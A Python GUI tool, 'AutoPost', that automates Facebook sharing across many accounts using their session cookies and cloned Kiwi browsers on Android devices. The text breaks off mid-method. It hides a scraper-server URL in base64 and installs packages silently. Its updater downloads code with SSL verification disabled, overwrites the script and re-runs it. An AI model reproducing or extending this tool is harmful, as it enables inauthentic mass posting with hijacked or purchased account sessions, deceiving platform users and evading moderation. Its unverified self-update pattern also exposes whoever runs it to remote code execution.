import sys
import os
import subprocess
import re
import base64
import json
import time
import random
import threading
import queue
import urllib.request
import webbrowser
import traceback
import shutil
import hashlib
from datetime import datetime
from tkinter import filedialog, messagebox
from tkinter import ttk
CUSTOM_ADB_PATH = r"C:\Users\user\AppData\Local\Android\sdk\platform-tools"
os.environ["PATH"] += os.pathsep + CUSTOM_ADB_PATH
_b64_url = "aHR0cHM6Ly9mYnNjcmFwZXIua2VzdWcuY29tL2luZGV4LnBocA=="
urlss = base64.b64decode(_b64_url).decode('utf-8')
def check_and_install_requirements():
    print("[*] Checking system requirements...")
    required_packages = {
        "customtkinter": "customtkinter",
        "playwright": "playwright"
    }
    needs_playwright_browser = False
    for module, package in required_packages.items():
        try:
            __import__(module)
        except ImportError:
            print(f"[*] Missing module '{module}'. Auto-installing '{package}'...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            if module == "playwright":
                needs_playwright_browser = True
    if needs_playwright_browser:
        print("[*] Installing Playwright Chromium browser. This may take a minute...")
        subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
        print("[*] Playwright setup complete.")
check_and_install_requirements()
import customtkinter as ctk
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
__version__ = "12"
UPDATE_URL = "https://raw.githubusercontent.com/versozadarwin23/fbcookie/refs/heads/main/main.py"
VERSION_CHECK_URL = "https://raw.githubusercontent.com/versozadarwin23/fbcookie/refs/heads/main/version.txt"
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")
COLORS = {
    "bg_main": "#0D1117",
    "bg_card": "#161B22",
    "bg_elevated": "#1C2128",
    "bg_lighter": "#21262D",
    "bg_hover": "#30363D",
    "primary": "#8B5CF6",
    "primary_hover": "#7C3AED",
    "primary_light": "#A78BFA",
    "primary_bg": "#2E1065",
    "primary_glow": "#6D28D9",
    "success": "#22C55E",
    "success_hover": "#16A34A",
    "success_bg": "#14532D",
    "success_glow": "#15803D",
    "warning": "#F59E0B",
    "warning_hover": "#D97706",
    "warning_bg": "#451A03",
    "danger": "#EF4444",
    "danger_hover": "#DC2626",
    "danger_bg": "#450A0A",
    "text_main": "#F0F6FC",
    "text_sub": "#8B949E",
    "text_muted": "#6E7681",
    "border": "#30363D",
    "border_light": "#484F58",
    "accent": "#06B6D4",
    "accent_hover": "#0891B2",
    "accent_bg": "#164E63",
    "gradient_start": "#8B5CF6",
    "gradient_end": "#EC4899"
}
FONT_HEADER = ("Segoe UI", 26, "bold")
FONT_SUBHEADER = ("Segoe UI", 16, "bold")
FONT_BODY = ("Segoe UI", 11)
FONT_BOLD = ("Segoe UI", 11, "bold")
FONT_SMALL = ("Segoe UI", 10)
class StatCard(ctk.CTkFrame):
    def __init__(self, parent, title, value, icon, color):
        super().__init__(parent, fg_color=COLORS["bg_elevated"], corner_radius=20, border_width=0)
        self.configure(border_width=1, border_color=COLORS["border_light"])
        self.value_var = ctk.StringVar(value=str(value))
        top_section = ctk.CTkFrame(self, fg_color="transparent")
        top_section.pack(fill="x", padx=20, pady=(20, 10))
        icon_bg_color = COLORS["primary_bg"]
        if color == COLORS["success"]:
            icon_bg_color = COLORS["success_bg"]
        elif color == COLORS["warning"]:
            icon_bg_color = COLORS["warning_bg"]
        elif color == COLORS["accent"]:
            icon_bg_color = COLORS["accent_bg"]
        elif color == COLORS["danger"]:
            icon_bg_color = COLORS["danger_bg"]
        icon_container = ctk.CTkFrame(top_section, fg_color=icon_bg_color, corner_radius=14, 
                                      width=56, height=56, border_width=2, border_color=color)
        icon_container.pack(side="right")
        icon_container.pack_propagate(False)
        self.icon_label = ctk.CTkLabel(icon_container, text=icon, font=("Segoe UI Emoji", 26), text_color=color)
        self.icon_label.pack(expand=True)
        self.title_label = ctk.CTkLabel(top_section, text=title.upper(), 
                                        font=("Segoe UI", 10, "bold"),
                                        text_color=COLORS["text_muted"], anchor="w")
        self.title_label.pack(side="left", anchor="nw")
        self.value_label = ctk.CTkLabel(self, textvariable=self.value_var, 
                                        font=("Segoe UI", 42, "bold"),
                                        text_color=color, anchor="w")
        self.value_label.pack(anchor="w", padx=20, pady=(0, 20))
    def update_value(self, new_value):
        self.value_var.set(str(new_value))
class StatsFrame(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent, fg_color="transparent")
        header_frame = ctk.CTkFrame(self, fg_color="transparent")
        header_frame.pack(anchor="w", pady=(0, 20))
        accent_bar = ctk.CTkFrame(header_frame, fg_color=COLORS["primary"], width=5, height=28, corner_radius=3)
        accent_bar.pack(side="left", padx=(0, 12))
        title_container = ctk.CTkFrame(header_frame, fg_color="transparent")
        title_container.pack(side="left")
        title = ctk.CTkLabel(title_container, text="📊 Live Analytics", 
                            font=("Segoe UI", 18, "bold"), 
                            text_color=COLORS["text_main"])
        title.pack(anchor="w")
        subtitle = ctk.CTkLabel(title_container, text="Real-time performance metrics", 
                               font=FONT_SMALL, 
                               text_color=COLORS["text_muted"])
        subtitle.pack(anchor="w")
        self.grid_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.grid_frame.pack(fill="both", expand=True)
        self.grid_frame.grid_columnconfigure((0, 1), weight=1)
        self.card_shares = StatCard(self.grid_frame, "Total Shares", "0", "🚀", COLORS["success"])
        self.card_shares.grid(row=0, column=0, padx=(0, 10), pady=10, sticky="ew")
        self.card_failed = StatCard(self.grid_frame, "Failed", "0", "⚠️", COLORS["warning"])
        self.card_failed.grid(row=0, column=1, padx=(10, 0), pady=10, sticky="ew")
        self.card_cookies = StatCard(self.grid_frame, "Cookies", "0", "🍪", COLORS["primary"])
        self.card_cookies.grid(row=1, column=0, padx=(0, 10), pady=10, sticky="ew")
        self.card_devices = StatCard(self.grid_frame, "Threads", "0", "💻", COLORS["accent"])
        self.card_devices.grid(row=1, column=1, padx=(10, 0), pady=10, sticky="ew")
    def update_stats(self, shares, failed):
        self.card_shares.update_value(shares)
        self.card_failed.update_value(failed)
    def update_devices(self, count):
        self.card_devices.update_value(count)
    def update_cookies(self, count):
        self.card_cookies.update_value(count)
class PairFrame(ctk.CTkFrame):
    def __init__(self, parent, pair_num, on_remove):
        super().__init__(parent, fg_color=COLORS["bg_elevated"], corner_radius=20, border_width=1,
                         border_color=COLORS["border_light"])
        self.on_remove = on_remove
        header = ctk.CTkFrame(self, fg_color=COLORS["bg_card"], corner_radius=18)
        header.pack(fill="x", padx=3, pady=3)
        header_content = ctk.CTkFrame(header, fg_color="transparent")
        header_content.pack(fill="x", padx=20, pady=16)
        icon_frame = ctk.CTkFrame(header_content, fg_color=COLORS["primary_bg"], 
                                  corner_radius=12, width=40, height=40,
                                  border_width=2, border_color=COLORS["primary"])
        icon_frame.pack(side="left", padx=(0, 12))
        icon_frame.pack_propagate(False)
        ctk.CTkLabel(icon_frame, text="🔗", font=("Segoe UI Emoji", 18)).pack(expand=True)
        title_container = ctk.CTkFrame(header_content, fg_color="transparent")
        title_container.pack(side="left", fill="x", expand=True)
        self.header_label = ctk.CTkLabel(title_container, text=f"Link #{pair_num}", 
                                         font=("Segoe UI", 15, "bold"),
                                         text_color=COLORS["text_main"], anchor="w")
        self.header_label.pack(anchor="w")
        ctk.CTkLabel(title_container, text="Configure target URL and caption", 
                    font=FONT_SMALL, text_color=COLORS["text_muted"], anchor="w").pack(anchor="w")
        if pair_num > 1:
            btn_del = ctk.CTkButton(header_content, text="✖", width=40, height=40, 
                                    fg_color=COLORS["bg_lighter"],
                                    hover_color=COLORS["danger"], 
                                    text_color=COLORS["text_sub"], 
                                    corner_radius=12,
                                    font=("Segoe UI", 16, "bold"),
                                    border_width=1,
                                    border_color=COLORS["border"],
                                    command=self.remove)
            btn_del.pack(side="right")
        content = ctk.CTkFrame(self, fg_color="transparent")
        content.pack(fill="x", padx=20, pady=(16, 20))
        url_frame = ctk.CTkFrame(content, fg_color="transparent")
        url_frame.pack(fill="x", pady=(0, 16))
        url_label_frame = ctk.CTkFrame(url_frame, fg_color="transparent")
        url_label_frame.pack(fill="x", pady=(0, 8))
        ctk.CTkLabel(url_label_frame, text="🌐", font=("Segoe UI Emoji", 14)).pack(side="left", padx=(0, 6))
        ctk.CTkLabel(url_label_frame, text="Target URL", font=("Segoe UI", 11, "bold"), 
                    text_color=COLORS["text_sub"]).pack(side="left")
        self.link_entry = ctk.CTkEntry(url_frame, height=46,
                                       placeholder_text="https://facebook.com/...",
                                       fg_color=COLORS["bg_card"], 
                                       border_color=COLORS["border_light"],
                                       border_width=2,
                                       corner_radius=12,
                                       font=("Segoe UI", 11))
        self.link_entry.pack(fill="x")
        cap_label_frame = ctk.CTkFrame(content, fg_color="transparent")
        cap_label_frame.pack(fill="x", pady=(0, 8))
        ctk.CTkLabel(cap_label_frame, text="📝", font=("Segoe UI Emoji", 14)).pack(side="left", padx=(0, 6))
        ctk.CTkLabel(cap_label_frame, text="Caption File", font=("Segoe UI", 11, "bold"), 
                    text_color=COLORS["text_sub"]).pack(side="left")
        cap_row = ctk.CTkFrame(content, fg_color="transparent")
        cap_row.pack(fill="x")
        self.caption_path = ctk.CTkEntry(cap_row, height=46, 
                                         placeholder_text="Select caption file (.txt)",
                                         fg_color=COLORS["bg_card"], 
                                         border_color=COLORS["border_light"],
                                         border_width=2,
                                         corner_radius=12,
                                         font=("Segoe UI", 11))
        self.caption_path.pack(side="left", fill="x", expand=True, padx=(0, 12))
        btn_browse = ctk.CTkButton(cap_row, text="📂 Browse", width=110, height=46, 
                                   fg_color=COLORS["primary"],
                                   hover_color=COLORS["primary_hover"], 
                                   border_width=0,
                                   corner_radius=12,
                                   font=("Segoe UI", 11, "bold"),
                                   command=self.browse_caption)
        btn_browse.pack(side="right")
    def remove(self):
        self.on_remove()
    def browse_caption(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.caption_path.delete(0, "end")
            self.caption_path.insert(0, file)
class FacebookAutomationGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.log_storage = {"auto": [], "debug": [], "sys": []}
        self.saved_settings = {}
        self.active_browsers = []
        self.cookie_queue = queue.Queue()
        self.title(f"AutoPost V{__version__}")
        self.geometry("1150x750")
        self.after(0, lambda: self.state("zoomed"))
        self.configure(fg_color=COLORS["bg_main"])
        self.is_running = False
        self.global_cookie_path = ""
        self.worker_threads = []
        self.active_worker_count = 0
        self.pair_widgets = []
        self.gnirehtet_process = None
        self.total_shares = 0
        self.error_count = 0
        self.expired_count = 0
        self.expired_accounts = set()
        self.total_attempts = 0
        self.job_list_global = []
        self.fast_mode_var = ctk.BooleanVar(value=True)
        self.history_file = "share_history.json"
        self.history_lock = threading.Lock()
        self.progress_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self.accounts_processed = 0
        self.total_accounts_to_process = 0
        self.share_history = self.load_share_history()
        self.layout_ui()
        self.load_settings()
        self.check_for_updates()
        self.protocol("WM_DELETE_WINDOW", self.on_close)
    def load_share_history(self):
        if os.path.exists(self.history_file):
            try:
                with open(self.history_file, "r") as f:
                    return json.load(f)
            except:
                return {}
        return {}
    def save_share_history(self):
        with self.history_lock:
            try:
                with open(self.history_file, "w") as f:
                    json.dump(self.share_history, f, indent=2)
            except Exception as e:
                pass
    def get_account_id(self, cookie_str):
        for pair in cookie_str.split(";"):
            if "=" in pair:
                name, value = pair.strip().split("=", 1)
                if name == "c_user":
                    return value
        return hashlib.md5(cookie_str.encode()).hexdigest()
    def check_for_updates(self, manual=False):
        if manual:
            self.status_badge.configure(text="● CHECKING...", text_color=COLORS["warning"])
        def _check():
            try:
                import ssl
                req = urllib.request.Request(VERSION_CHECK_URL, headers={'Cache-Control': 'no-cache'})
                with urllib.request.urlopen(req, timeout=5, context=ssl._create_unverified_context()) as response:
                    remote_version = response.read().decode('utf-8').strip()
                if remote_version and remote_version != __version__:
                    self.after(0, lambda: self.show_update_popup(remote_version))
                else:
                    if manual:
                        self.after(0, lambda: messagebox.showinfo("Up to Date", f"Latest Version: V{__version__}"))
            except Exception as e:
                pass
            finally:
                if manual:
                    self.after(0, lambda: self.status_badge.configure(text="● IDLE", text_color=COLORS["text_sub"]))
        threading.Thread(target=_check, daemon=True).start()
    def show_update_popup(self, remote_version):
        msg = f"A new update is available! (Version V{remote_version})\n\nWould you like to download and install the update now?"
        response = messagebox.askyesno("Update Available", msg)
        if response:
            try:
                import ssl
                req = urllib.request.Request(UPDATE_URL, headers={'Cache-Control': 'no-cache'})
                with urllib.request.urlopen(req, timeout=10,
                                            context=ssl._create_unverified_context()) as download_response:
                    new_code = download_response.read().decode('utf-8')
                current_file = os.path.abspath(__file__)
                with open(current_file, 'w', encoding='utf-8') as f:
                    f.write(new_code)
                messagebox.showinfo("Update Complete",
                                    "The application has been updated successfully. It will now restart.")
                os.execl(sys.executable, sys.executable, *sys.argv)
            except Exception as e:
                messagebox.showerror("Update Failed", f"An error occurred while updating:\n{e}")
                self.after(6000, self.check_for_updates)
        else:
            self.after(6000, self.check_for_updates)
    def play_tab_transition(self, tab_frame):
        overlay = ctk.CTkFrame(tab_frame, fg_color=COLORS["bg_main"], corner_radius=0)
        overlay.place(relx=0, rely=0, relwidth=1, relheight=1)
        def wipe_out(step):
            if step > 0:
                overlay.place(relheight=step)
                self.after(15, lambda: wipe_out(step - 0.15))
            else:
                overlay.place_forget()
                overlay.destroy()
        wipe_out(1.0)
    def on_tab_change(self):
        selected = self.tabview.get()
        if selected == "   Saved Profiles   ":
            self.populate_saved_profiles()
            self.play_tab_transition(self.tab_saved)
        elif selected == "   Expired Cookies   ":
            self.play_tab_transition(self.tab_expired)
        elif selected == "   System Logs   ":
            self.play_tab_transition(self.tab_logs)
        elif selected == "   Dashboard   ":
            self.play_tab_transition(self.tab_dash)
        elif selected == "   Settings   ":
            self.play_tab_transition(self.tab_settings)
        elif selected == "   About   ":
            self.play_tab_transition(self.tab_about)
    def layout_ui(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        header = ctk.CTkFrame(self, fg_color=COLORS["bg_card"], height=80, corner_radius=0, border_width=0)
        header.grid(row=0, column=0, sticky="ew")
        gradient_border = ctk.CTkFrame(self, fg_color=COLORS["primary"], height=3, corner_radius=0)
        gradient_border.grid(row=0, column=0, sticky="sew")
        title_frame = ctk.CTkFrame(header, fg_color="transparent")
        title_frame.pack(side="left", padx=35, pady=20)
        logo_container = ctk.CTkFrame(title_frame, fg_color="transparent")
        logo_container.pack(side="left", padx=(0, 16))
        logo_bg = ctk.CTkFrame(logo_container, fg_color=COLORS["primary_bg"], 
                              corner_radius=14, width=50, height=50,
                              border_width=2, border_color=COLORS["primary"])
        logo_bg.pack()
        logo_bg.pack_propagate(False)
        ctk.CTkLabel(logo_bg, text="⚡", font=("Segoe UI Emoji", 28)).pack(expand=True)
        text_container = ctk.CTkFrame(title_frame, fg_color="transparent")
        text_container.pack(side="left")
        title_row = ctk.CTkFrame(text_container, fg_color="transparent")
        title_row.pack(anchor="w")
        ctk.CTkLabel(title_row, text="AUTOPOST", font=("Segoe UI", 22, "bold"), 
                    text_color=COLORS["text_main"]).pack(side="left")
        version_badge = ctk.CTkFrame(title_row, fg_color=COLORS["primary_bg"], 
                                     corner_radius=8, border_width=1, border_color=COLORS["primary"])
        version_badge.pack(side="left", padx=(10, 0))
        ctk.CTkLabel(version_badge, text=f"v{__version__}", 
                    font=("Segoe UI", 9, "bold"), 
                    text_color=COLORS["primary_light"]).pack(padx=10, pady=4)
        
        dev_credit_frame = ctk.CTkFrame(text_container, fg_color="transparent")
        dev_credit_frame.pack(anchor="w", pady=(3, 0))
        
        ctk.CTkLabel(dev_credit_frame, text="Developed With Love", 
                    font=("Segoe UI", 12), 
                    text_color=COLORS["text_sub"]).pack(side="left", padx=(0, 5))
        
        ctk.CTkLabel(dev_credit_frame, text="❤️", 
                    font=("Segoe UI Emoji", 16),
                    text_color="#FF6B9D").pack(side="left", padx=(0, 5))
        
        ctk.CTkLabel(dev_credit_frame, text="By", 
                    font=("Segoe UI", 12), 
                    text_color=COLORS["text_sub"]).pack(side="left", padx=(0, 5))
        
        dars_badge = ctk.CTkFrame(dev_credit_frame, fg_color=COLORS["primary_bg"], 
                                 corner_radius=8, border_width=1, border_color=COLORS["primary"])
        dars_badge.pack(side="left")
        ctk.CTkLabel(dars_badge, text="Dars", 
                    font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["primary_light"]).pack(padx=12, pady=3)
        
        status_container = ctk.CTkFrame(header, fg_color=COLORS["bg_elevated"], 
                                       corner_radius=25, height=44,
                                       border_width=1, border_color=COLORS["border_light"])
        status_container.pack(side="right", padx=35)
        status_inner = ctk.CTkFrame(status_container, fg_color="transparent")
        status_inner.pack(padx=20, pady=10)
        self.status_badge = ctk.CTkLabel(status_inner, text="● Idle", 
                                         font=("Segoe UI", 12, "bold"),
                                         text_color=COLORS["text_sub"])
        self.status_badge.pack()
        main_content = ctk.CTkFrame(self, fg_color="transparent")
        main_content.grid(row=1, column=0, sticky="nsew", padx=25, pady=25)
        main_content.grid_rowconfigure(0, weight=1)
        main_content.grid_columnconfigure(0, weight=1)
        self.tabview = ctk.CTkTabview(main_content, fg_color=COLORS["bg_card"], corner_radius=20,
                                      segmented_button_selected_color=COLORS["primary"],
                                      segmented_button_selected_hover_color=COLORS["primary_hover"],
                                      segmented_button_unselected_color=COLORS["bg_lighter"],
                                      segmented_button_unselected_hover_color=COLORS["bg_hover"],
                                      text_color=COLORS["text_main"],
                                      border_width=1,
                                      border_color=COLORS["border_light"],
                                      command=self.on_tab_change)
        self.tabview.grid(row=0, column=0, sticky="nsew")
        self.tab_dash = self.tabview.add("   Dashboard   ")
        self.tab_logs = self.tabview.add("   System Logs   ")
        self.tab_saved = self.tabview.add("   Saved Profiles   ")
        self.tab_expired = self.tabview.add("   Expired Cookies   ")
        self.tab_settings = self.tabview.add("   Settings   ")
        self.tab_about = self.tabview.add("   About   ")
        self.setup_dashboard()
        self.setup_logs()
        self.setup_saved_profiles()
        self.setup_expired_cookies()
        self.setup()
        self.setup_about()
    def setup_dashboard(self):
        self.tab_dash.grid_columnconfigure(1, weight=1)
        self.tab_dash.grid_rowconfigure(0, weight=1)
        left_panel = ctk.CTkScrollableFrame(self.tab_dash, fg_color="transparent", width=380)
        left_panel.grid(row=0, column=0, sticky="nsew", padx=(0, 15))
        self.overall_stats = StatsFrame(left_panel)
        self.overall_stats.pack(fill="x", pady=(5, 20))
        control_frame = ctk.CTkFrame(left_panel, fg_color=COLORS["bg_elevated"], corner_radius=20, border_width=1,
                                     border_color=COLORS["border_light"])
        control_frame.pack(fill="x", pady=(0, 16))
        header_section = ctk.CTkFrame(control_frame, fg_color=COLORS["bg_card"], corner_radius=18)
        header_section.pack(fill="x", padx=3, pady=3)
        header_content = ctk.CTkFrame(header_section, fg_color="transparent")
        header_content.pack(fill="x", padx=20, pady=16)
        accent_line = ctk.CTkFrame(header_content, fg_color=COLORS["primary"], width=5, height=24, corner_radius=3)
        accent_line.pack(side="left", padx=(0, 12))
        header_text = ctk.CTkFrame(header_content, fg_color="transparent")
        header_text.pack(side="left")
        ctk.CTkLabel(header_text, text="⚙️ Configuration", font=("Segoe UI", 15, "bold"),
                     text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text, text="Setup automation parameters", font=FONT_SMALL,
                     text_color=COLORS["text_muted"]).pack(anchor="w")
        content_area = ctk.CTkFrame(control_frame, fg_color="transparent")
        content_area.pack(fill="x", padx=20, pady=(12, 20))
        lbl_server = ctk.CTkLabel(content_area, text="☁️ Cloud Sync", font=("Segoe UI", 11, "bold"),
                                  text_color=COLORS["text_sub"])
        lbl_server.pack(anchor="w", pady=(0, 8))
        server_row = ctk.CTkFrame(content_area, fg_color="transparent")
        server_row.pack(fill="x", pady=(0, 16))
        self.server_folder_entry = ctk.CTkEntry(server_row, height=46,
                                                placeholder_text="Enter folder name (e.g., campaign1)",
                                                corner_radius=12, border_color=COLORS["border_light"],
                                                border_width=2,
                                                fg_color=COLORS["bg_card"])
        self.server_folder_entry.pack(side="left", fill="x", expand=True, padx=(0, 12))
        btn_fetch = ctk.CTkButton(server_row, text="⬇️ Fetch", width=100, height=46,
                                  fg_color=COLORS["accent"],
                                  hover_color=COLORS["accent_hover"],
                                  font=("Segoe UI", 11, "bold"),
                                  corner_radius=12, command=self.fetch_from_server)
        btn_fetch.pack(side="right")
        lbl_cookies = ctk.CTkLabel(content_area, text="🍪 Cookie File", font=("Segoe UI", 11, "bold"),
                                   text_color=COLORS["text_sub"])
        lbl_cookies.pack(anchor="w", pady=(0, 8))
        cookie_row = ctk.CTkFrame(content_area, fg_color="transparent")
        cookie_row.pack(fill="x", pady=(0, 16))
        self.cookie_entry = ctk.CTkEntry(cookie_row, height=46, placeholder_text="Select cookies.txt...",
                                         corner_radius=12, border_color=COLORS["border_light"],
                                         border_width=2,
                                         fg_color=COLORS["bg_card"])
        self.cookie_entry.pack(side="left", fill="x", expand=True, padx=(0, 12))
        self.cookie_entry.insert(0, self.global_cookie_path)
        btn_browse = ctk.CTkButton(cookie_row, text="📂", width=56, height=46,
                                   fg_color=COLORS["bg_lighter"],
                                   hover_color=COLORS["primary"], border_width=0,
                                   corner_radius=12, font=("Segoe UI", 18),
                                   command=self.browse_global_cookie)
        btn_browse.pack(side="right")
        self.use_saved_profiles_var = ctk.BooleanVar(value=False)
        saved_profiles_frame = ctk.CTkFrame(content_area, fg_color=COLORS["bg_card"],
                                           corner_radius=14, border_width=1, border_color=COLORS["border"])
        saved_profiles_frame.pack(fill="x", pady=(0, 16))
        saved_profiles_content = ctk.CTkFrame(saved_profiles_frame, fg_color="transparent")
        saved_profiles_content.pack(fill="x", padx=18, pady=14)
        left_content = ctk.CTkFrame(saved_profiles_content, fg_color="transparent")
        left_content.pack(side="left", fill="x", expand=True)
        icon_text_row = ctk.CTkFrame(left_content, fg_color="transparent")
        icon_text_row.pack(anchor="w")
        ctk.CTkLabel(icon_text_row, text="💾", font=("Segoe UI Emoji", 16)).pack(side="left", padx=(0, 8))
        text_container = ctk.CTkFrame(icon_text_row, fg_color="transparent")
        text_container.pack(side="left")
        ctk.CTkLabel(text_container, text="Use All Saved Profiles",
                    font=("Segoe UI", 11, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(text_container, text="Ignore cookie file, use saved sessions",
                    font=FONT_SMALL,
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        self.saved_profiles_toggle = ctk.CTkSwitch(saved_profiles_content, text="",
                                                   variable=self.use_saved_profiles_var,
                                                   progress_color=COLORS["primary"],
                                                   button_color=COLORS["text_main"],
                                                   button_hover_color=COLORS["primary_light"],
                                                   command=self.toggle_saved_profiles_mode)
        self.saved_profiles_toggle.pack(side="right")
        switch_container = ctk.CTkFrame(content_area, fg_color=COLORS["bg_card"], corner_radius=14,
                                       border_width=1, border_color=COLORS["border"])
        switch_container.pack(fill="x", pady=(0, 16))
        self.fast_mode_switch = ctk.CTkSwitch(switch_container, text="⚡ Fast Mode (Block Media)",
                                              variable=self.fast_mode_var, font=("Segoe UI", 11),
                                              progress_color=COLORS["primary"],
                                              button_color=COLORS["text_main"],
                                              button_hover_color=COLORS["primary_light"])
        self.fast_mode_switch.pack(anchor="w", padx=18, pady=(14, 10))
        self.adb_wireless_var = ctk.BooleanVar(value=False)
        self.adb_toggle = ctk.CTkSwitch(switch_container, text="📱 ADB Wireless",
                                        variable=self.adb_wireless_var, font=("Segoe UI", 11),
                                        progress_color=COLORS["success"],
                                        button_color=COLORS["text_main"],
                                        button_hover_color=COLORS["success_hover"],
                                        command=self.toggle_adb_wireless)
        self.adb_toggle.pack(anchor="w", padx=18, pady=10)
        self.gnirehtet_var = ctk.BooleanVar(value=False)
        self.gnirehtet_toggle = ctk.CTkSwitch(switch_container, text="🌐 Full Internet via USB",
                                              variable=self.gnirehtet_var, font=("Segoe UI", 11),
                                              progress_color=COLORS["accent"],
                                              button_color=COLORS["text_main"],
                                              button_hover_color=COLORS["accent_hover"],
                                              command=self.toggle_gnirehtet_full)
        self.gnirehtet_toggle.pack(anchor="w", padx=18, pady=(10, 14))
        lbl_delay = ctk.CTkLabel(content_area, text="⏱️ Action Delays", font=("Segoe UI", 11, "bold"),
                                 text_color=COLORS["text_sub"])
        lbl_delay.pack(anchor="w", pady=(0, 8))
        delay_row = ctk.CTkFrame(content_area, fg_color="transparent")
        delay_row.pack(fill="x", pady=(0, 20))
        delay_left = ctk.CTkFrame(delay_row, fg_color="transparent")
        delay_left.pack(side="left", fill="x", expand=True, padx=(0, 10))
        ctk.CTkLabel(delay_left, text="Pre-Action (sec)", font=FONT_SMALL,
                    text_color=COLORS["text_muted"]).pack(anchor="w", pady=(0, 6))
        self.dash_pre_delay = ctk.CTkEntry(delay_left, height=44, justify="center", corner_radius=12,
                                           fg_color=COLORS["bg_card"], border_color=COLORS["border_light"],
                                           border_width=2, font=("Segoe UI", 12, "bold"))
        self.dash_pre_delay.pack(fill="x")
        self.dash_pre_delay.insert(0, "10")
        delay_right = ctk.CTkFrame(delay_row, fg_color="transparent")
        delay_right.pack(side="right", fill="x", expand=True, padx=(10, 0))
        ctk.CTkLabel(delay_right, text="Post-Action (sec)", font=FONT_SMALL,
                    text_color=COLORS["text_muted"]).pack(anchor="w", pady=(0, 6))
        self.dash_post_delay = ctk.CTkEntry(delay_right, height=44, justify="center", corner_radius=12,
                                            fg_color=COLORS["bg_card"], border_color=COLORS["border_light"],
                                            border_width=2, font=("Segoe UI", 12, "bold"))
        self.dash_post_delay.pack(fill="x")
        self.dash_post_delay.insert(0, "10")
        btn_grid = ctk.CTkFrame(content_area, fg_color="transparent")
        btn_grid.pack(fill="x", pady=(0, 16))
        self.start_btn = ctk.CTkButton(btn_grid, text="▶ Start Engine", height=52,
                                       fg_color=COLORS["success"],
                                       hover_color=COLORS["success_hover"],
                                       font=("Segoe UI", 13, "bold"),
                                       corner_radius=14,
                                       border_width=0,
                                       command=self.start_threads)
        self.start_btn.pack(side="left", fill="x", expand=True, padx=(0, 8))
        self.stop_btn = ctk.CTkButton(btn_grid, text="⏹ Stop", height=52,
                                      fg_color=COLORS["danger"],
                                      hover_color=COLORS["danger_hover"],
                                      font=("Segoe UI", 13, "bold"),
                                      state="disabled",
                                      corner_radius=14,
                                      border_width=0,
                                      command=self.stop_automation)
        self.stop_btn.pack(side="left", fill="x", expand=True, padx=(8, 0))
        ctk.CTkButton(content_area, text="💾 Save Configuration", height=44,
                      fg_color="transparent",
                      border_width=2, border_color=COLORS["primary"],
                      text_color=COLORS["primary"],
                      font=("Segoe UI", 11, "bold"),
                      corner_radius=12, hover_color=COLORS["bg_card"],
                      command=self.save_config).pack(fill="x", pady=(0, 10))
        ctk.CTkButton(content_area, text="🔄 Check for Updates", height=44,
                      fg_color="transparent",
                      border_width=2, border_color=COLORS["warning"],
                      text_color=COLORS["warning"],
                      font=("Segoe UI", 11, "bold"),
                      corner_radius=12, hover_color=COLORS["bg_card"],
                      command=lambda: self.check_for_updates(manual=True)).pack(fill="x", pady=(0, 10))
        ctk.CTkButton(content_area, text="🗑 Clear Share History", height=44,
                      fg_color="transparent",
                      border_width=2, border_color=COLORS["danger"],
                      text_color=COLORS["danger"],
                      font=("Segoe UI", 11, "bold"),
                      corner_radius=12, hover_color=COLORS["bg_card"],
                      command=self.clear_share_history).pack(fill="x")
        self.kiwi_frame = ctk.CTkFrame(left_panel, fg_color=COLORS["bg_card"], corner_radius=16, border_width=1,
                                       border_color=COLORS["border"])
        self.kiwi_frame.pack(fill="x", pady=(0, 20))
        kiwi_header = ctk.CTkFrame(self.kiwi_frame, fg_color="transparent")
        kiwi_header.pack(fill="x", padx=18, pady=(18, 12))
        accent_line = ctk.CTkFrame(kiwi_header, fg_color=COLORS["success"], width=4, height=20, corner_radius=2)
        accent_line.pack(side="left", padx=(0, 10))
        ctk.CTkLabel(kiwi_header, text="🥝 Kiwi Launcher", font=("Segoe UI", 14, "bold"),
                     text_color=COLORS["text_main"]).pack(side="left")
        ctk.CTkButton(kiwi_header, text="+ Add", width=70, height=32,
                      fg_color=COLORS["bg_lighter"],
                      hover_color=COLORS["success"],
                      font=("Segoe UI", 10, "bold"),
                      corner_radius=8,
                      command=self.add_kiwi_entry).pack(side="right")
        delay_frame = ctk.CTkFrame(self.kiwi_frame, fg_color="transparent")
        delay_frame.pack(fill="x", padx=18, pady=(0, 12))
        ctk.CTkLabel(delay_frame, text="⏱️ Wait Time (seconds):", font=("Segoe UI", 11),
                     text_color=COLORS["text_sub"]).pack(side="left")
        self.kiwi_delay_entry = ctk.CTkEntry(delay_frame, width=70, height=32,
                                             fg_color=COLORS["bg_main"],
                                             border_color=COLORS["border"],
                                             border_width=1,
                                             corner_radius=8,
                                             justify="center")
        self.kiwi_delay_entry.pack(side="right")
        self.kiwi_delay_entry.insert(0, "8")
        self.kiwi_entries_container = ctk.CTkFrame(self.kiwi_frame, fg_color="transparent")
        self.kiwi_entries_container.pack(fill="x", pady=(0, 8))
        self.kiwi_entries = []
        default_kiwis = [
            "com.kiwibrowser.browser",
            "com.kiwibrowser.browses",
            "com.kiwibrowser.browset",
            "com.kiwibrowser.browseu",
            "com.kiwibrowser.browsev"
        ]
        for pkg in default_kiwis:
            self.add_kiwi_entry(pkg)
        kiwi_btn_frame = ctk.CTkFrame(self.kiwi_frame, fg_color="transparent")
        kiwi_btn_frame.pack(fill="x", padx=18, pady=(12, 18))
        btn_kiwi_launch = ctk.CTkButton(kiwi_btn_frame, text="🚀 Launch", height=44,
                                        fg_color=COLORS["success"],
                                        hover_color=COLORS["success_hover"],
                                        font=FONT_BOLD,
                                        corner_radius=10,
                                        command=self.launch_kiwi_browsers)
